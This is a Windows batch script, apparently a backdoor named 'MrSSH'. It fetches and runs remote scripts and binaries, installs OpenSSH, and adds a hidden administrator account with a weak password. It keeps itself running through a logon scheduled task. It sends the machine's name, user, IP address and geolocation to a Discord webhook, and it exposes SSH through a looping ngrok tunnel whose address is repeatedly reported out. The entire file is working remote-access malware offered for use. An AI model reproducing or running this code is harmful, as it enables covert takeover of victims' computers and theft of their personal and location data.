cd %temp%

curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "source.bat"
curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"

powershell ./OpenSSH.ps1

net user "Admin" "Administrator" /add
net localgroup Administrators Admin /add
net localgroup Administratorzy Admin /add
net localgroup Administración  Admin /add

mkdir %appdata%\MrSSH
cd %appdata%\MrSSH & curl -Ls https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat -o "onglogon.bat"
schtasks /create /tn "MrSSH" /sc onlogon /tr "onlogon.bat"
cd %temp%

set "webhook="

:: router info command
curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router>router.txt

:: router set info
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.vpn`) DO (SET vpn=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.proxy`) DO (SET proxy=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter query`) DO (SET local=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter city`) DO (SET city=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lat`) DO (SET lat=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lon`) DO (SET lon=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter isp`) DO (SET isp=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter regionName`) DO (SET region=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter Timezone`) DO (SET zone=%%F)
FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)

call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"

tar -xf ngrok.zip

start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F 
start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60

:ngrokloop
call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
goto ngrokloop
